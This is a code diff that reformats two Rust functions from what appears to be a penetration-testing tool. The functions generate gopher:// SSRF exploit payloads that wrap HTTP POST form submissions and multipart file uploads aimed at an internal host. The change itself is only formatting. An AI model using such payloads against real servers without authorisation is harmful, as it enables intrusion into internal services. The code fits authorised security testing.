@@ -5,7 +5,11 @@ use std::collections::HashMap;
 use std::fs;
 
 /// Generate Gopher HTTP POST exploit payload
-pub fn gopher_http_post_exp(addr: &str, uri: &str, data: &HashMap<String, String>) -> Result<String> {
+pub fn gopher_http_post_exp(
+    addr: &str,
+    uri: &str,
+    data: &HashMap<String, String>,
+) -> Result<String> {
     // Build form data
     let form_data: Vec<String> = data
         .iter()
@@ -13,10 +17,12 @@ pub fn gopher_http_post_exp(addr: &str, uri: &str, data: &HashMap<String, String
         .collect();
     let body = form_data.join("&");
 
-    let headers = [format!("POST {uri} HTTP/1.1"),
+    let headers = [
+        format!("POST {uri} HTTP/1.1"),
         format!("Host: {addr}"),
         "Content-Type: application/x-www-form-urlencoded".to_string(),
-        format!("Content-Length: {}", body.len())];
+        format!("Content-Length: {}", body.len()),
+    ];
 
     let request = format!("{}\r\n\r\n{}", headers.join("\r\n"), body);
     let encoded = urlencoding::encode(&request).replace('+', "%20");
@@ -33,7 +39,11 @@ fn generate_boundary() -> String {
 }
 
 /// Generate Gopher HTTP file upload exploit payload
-pub fn gopher_http_upload_exp(addr: &str, uri: &str, data: &HashMap<String, String>) -> Result<String> {
+pub fn gopher_http_upload_exp(
+    addr: &str,
+    uri: &str,
+    data: &HashMap<String, String>,
+) -> Result<String> {
     let boundary = generate_boundary();
     let mut body_parts: Vec<String> = Vec::new();
 
@@ -61,14 +71,15 @@ pub fn gopher_http_upload_exp(addr: &str, uri: &str, data: &HashMap<String, Stri
     let body = body_parts.join("\r\n");
 
     let content_type = format!("multipart/form-data; boundary={boundary}");
-    let headers = [format!("POST {uri} HTTP/1.1"),
+    let headers = [
+        format!("POST {uri} HTTP/1.1"),
         format!("Host: {addr}"),
         format!("Content-Type: {content_type}"),
-        format!("Content-Length: {}", body.len())];
+        format!("Content-Length: {}", body.len()),
+    ];
 
     let request = format!("{}\r\n\r\n{}", headers.join("\r\n"), body);
     let encoded = urlencoding::encode(&request).replace('+', "%20");
 
     Ok(format!("gopher://{addr}/_{encoded}"))
 }
-
